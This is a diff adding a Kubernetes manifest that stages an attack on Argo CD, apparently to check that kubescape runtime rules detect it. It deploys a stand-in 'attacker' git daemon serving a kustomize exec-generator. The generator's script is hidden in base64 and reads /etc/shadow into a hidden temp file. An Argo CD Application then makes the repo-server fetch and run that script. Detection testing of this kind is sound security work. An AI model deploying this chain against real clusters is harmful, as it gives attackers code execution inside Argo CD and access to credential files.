@@ -1,0 +1,85 @@
+# Argo CD malicious-render attack — VALIDATED end-to-end on k3s+kubescape
+# (2026-06-04). Drives the repo-server's own `kustomize build --enable-exec`
+# to run an attacker-supplied exec-generator INSIDE the argocd-repo-server
+# container during manifest render.
+#
+# Observed referral (container argocd-repo-server, ns argocd):
+#   process tree: tini -> argocd-repo-server -> kustomize build
+#                 --enable-alpha-plugins --enable-exec -> mal.sh (/usr/bin/dash)
+#   R0001  Unexpected process launched: mal.sh   (comm not in AP allowlist)
+#   R0010  Unexpected sensitive file access: /etc/shadow by process head
+#   R0002  corroborating (mal.sh/id/head reads)
+#
+# Prereq for the spawn to be Argo-driven (set by example/argocd/argocd.yaml):
+#   - argocd-cm: kustomize.buildOptions: "--enable-alpha-plugins --enable-exec"
+#   - the repo-server must reach git://attacker.adv.svc.cluster.local (git daemon)
+#     NOTE: Argo's ls-remote uses go-git (smart protocol only) — dumb-HTTP and
+#     `git daemon` (git://) work; a static file server does NOT.
+---
+# Attacker: a git-daemon hosting a malicious kustomize exec-generator repo.
+# Lives in ns `adv` (matches attacks.yaml's attacker.adv.svc convention).
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: attacker
+  namespace: adv
+  labels: {app: attacker}
+spec:
+  replicas: 1
+  selector: {matchLabels: {app: attacker}}
+  template:
+    metadata: {labels: {app: attacker}}
+    spec:
+      containers:
+      - name: attacker
+        image: alpine/git:latest
+        resources: {limits: {cpu: "500m", memory: "256Mi"}}
+        command: ["sh", "-c"]
+        args:
+          - |
+            set -e
+            apk add --no-cache git-daemon >/dev/null 2>&1 || apk add --no-cache git-daemon
+            mkdir -p /repos /work && cd /work
+            git init -q && git config user.email a@b.c && git config user.name a
+            printf 'generators:\n- malgen.yaml\n' > kustomization.yaml
+            printf 'apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: malgen\n  annotations:\n    config.kubernetes.io/function: |\n      exec:\n        path: ./mal.sh\n' > malgen.yaml
+            # mal.sh (base64): reads /etc/shadow + runs id during render, then
+            # emits a valid KRM ResourceList (kustomize exec contract — a bare
+            # resource yields "unexpected EOF" under Argo's pipe).
+            echo 'IyEvYmluL3NoCmNhdCA+L2Rldi9udWxsIDI+JjEKaGVhZCAtYyA2NCAvZXRjL3NoYWRvdyA+L3RtcC8ueCAyPi9kZXYvbnVsbAppZCA+L2Rldi9udWxsIDI+JjEKY2F0IDw8J09VVCcKYXBpVmVyc2lvbjogY29uZmlnLmt1YmVybmV0ZXMuaW8vdjEKa2luZDogUmVzb3VyY2VMaXN0Cml0ZW1zOgotIGFwaVZlcnNpb246IHYxCiAga2luZDogQ29uZmlnTWFwCiAgbWV0YWRhdGE6CiAgICBuYW1lOiBtYWxyZW5kZXItb3V0CiAgICBuYW1lc3BhY2U6IGFyZ29jZAogIGRhdGE6CiAgICByZW5kZXJlZDogInRydWUiCk9VVAo=' | base64 -d > mal.sh
+            chmod +x mal.sh
+            git add -A && git commit -qm x
+            git clone -q --bare /work /repos/repo.git
+            cd /repos/repo.git && git update-server-info && touch git-daemon-export-ok
+            echo "git daemon serving on 9418"
+            exec git daemon --reuseaddr --export-all --base-path=/repos --verbose /repos
+        ports: [{containerPort: 9418}]
+---
+apiVersion: v1
+kind: Service
+metadata: {name: attacker, namespace: adv}
+spec:
+  selector: {app: attacker}
+  ports: [{port: 9418, targetPort: 9418}]
+---
+# The probe: an Application pointing at the attacker repo. The
+# application-controller reconciles it -> calls repo-server GenerateManifest
+# -> repo-server runs `kustomize build --enable-exec` -> mal.sh spawns.
+# (Core mode: no argocd-server API; the CR itself is the trigger. A hard
+# refresh annotation forces immediate re-render.)
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: probe-app
+  namespace: argocd
+  annotations:
+    argocd.argoproj.io/refresh: hard
+spec:
+  project: default
+  source:
+    repoURL: git://attacker.adv.svc.cluster.local/repo.git
+    path: "."
+    targetRevision: HEAD
+  destination:
+    server: https://kubernetes.default.svc
+    namespace: argocd
